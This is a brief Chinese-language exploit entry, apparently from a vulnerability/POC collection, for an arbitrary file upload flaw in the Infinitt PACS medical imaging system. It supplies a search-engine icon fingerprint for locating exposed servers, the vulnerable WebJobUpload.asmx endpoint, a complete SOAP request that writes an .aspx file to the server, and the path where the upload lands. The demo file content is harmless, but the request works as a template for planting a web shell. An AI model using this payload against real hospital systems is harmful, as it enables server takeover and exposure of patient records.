# 英飞达影像存档与通讯(PACS)系统任意文件上传漏洞

英飞达影像存档与通讯(PACS)系统 ｜ 文件上传 ｜ —
- **指纹**：`web.icon="0cd46e0cba3abd067cd28e70eb7f2a5f"`
- **请求**：`POST /webservices/WebJobUpload.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<jobUpload xmlns="http://rainier">
<vcode>1</vcode>
<subFolder></subFolder>
<fileName>2.aspx</fileName>
<bufValue>MTIz</bufValue>
</jobUpload>
</soap:Body>
</soap:Envelope>
上传位置：/1/2.aspx
```